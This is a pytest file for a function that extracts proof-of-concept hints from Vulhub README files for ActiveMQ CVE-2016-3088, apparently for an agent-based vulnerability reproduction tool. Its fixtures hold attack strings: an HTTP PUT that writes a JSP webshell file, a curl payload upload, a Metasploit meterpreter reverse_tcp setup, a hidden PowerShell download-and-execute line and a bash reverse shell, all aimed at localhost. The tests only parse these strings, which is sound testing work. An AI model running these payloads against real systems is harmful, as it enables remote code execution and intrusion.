from pathlib import Path

from app.agents.poc_hints import extract_poc_hints
from app.targets.material import LocalSource, TargetMaterial


CVE = "CVE-2016-3088"


def material(*, document: str, supporting: tuple[LocalSource, ...] = ()) -> TargetMaterial:
    source = LocalSource(Path(f"/vulhub/activemq/{CVE}/README.md"), document, "0" * 64)
    return TargetMaterial(
        CVE,
        Path("/vulhub"),
        Path(f"/vulhub/activemq/{CVE}"),
        source,
        supporting,
        {"compose": {"services": {"activemq": {"image": "example/activemq:1"}}}},
    )


def test_extracts_http_console_and_command_blocks_with_exact_sources():
    http = "PUT /filesystem/v1 HTTP/1.1\nHost: localhost\nDestination: file:///opt/activemq/webapps/api/s.jsp"
    console = "use exploit/multi/http/example\nset TARGETURI /filesystem/v1\nrun"
    command = "curl -X PUT --data-binary @payload.jsp http://localhost/filesystem/v1"
    target = material(document=f"PoC:\n```http\n{http}\n```\n```text\n{console}\n```\n```sh\n{command}\n```")

    hints = extract_poc_hints(target)

    assert [(hint.kind, hint.content) for hint in hints] == [
        ("http_request", http),
        ("payload", http),
        ("metasploit_console", console),
        ("poc_command", command),
        ("payload", command),
    ]
    assert all(hint.source.endswith("README.md") for hint in hints)
    assert all(hint.quote == hint.content and hint.quote in target.document.content for hint in hints)


def test_extracts_raw_http_requests_and_deduplicates_fenced_requests():
    request = "GET /api/status HTTP/1.1\nHost: localhost"
    target = material(document=f"Example:\n```\n{request}\n```\n\n{request}")

    hints = extract_poc_hints(target)

    assert len(hints) == 1
    assert hints[0].kind == "http_request"
    assert hints[0].quote == request


def test_ignores_non_markdown_and_unrelated_blocks():
    config = LocalSource(Path("docker-compose.yml"), "services:\n  web: {}", "0" * 64)
    target = material(document="```yaml\nservices:\n  web:\n    image: example/web:1\n```", supporting=(config,))

    assert extract_poc_hints(target) == ()


def test_hint_limit_is_bounded_and_quotes_remain_source_substrings():
    content = "\n\n".join(f"GET /path-{index} HTTP/1.1" for index in range(20))
    target = material(document=content)

    hints = extract_poc_hints(target, max_hints=3, max_chars=12)

    assert len(hints) == 3
    assert all(len(hint.quote) <= 12 for hint in hints)
    assert all(hint.quote in content for hint in hints)


def test_extracts_explicit_payload_and_platform_clues_with_sources():
    console = "use exploit/multi/http/example\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nrun"
    powershell = "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://localhost/payload.ps1')"
    reverse = "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
    target = material(document=f"```text\n{console}\n```\n```powershell\n{powershell}\n```\n```bash\n{reverse}\n```")

    hints = [hint for hint in extract_poc_hints(target) if hint.kind == "payload"]

    assert [(hint.payload_name, hint.platform, hint.architecture) for hint in hints] == [
        ("windows/x64/meterpreter/reverse_tcp", "windows", "x64"),
        (None, "windows", None),
        (None, "linux", None),
    ]
    assert all(hint.quote in target.document.content for hint in hints)
    assert all(hint.source.endswith("README.md") for hint in hints)
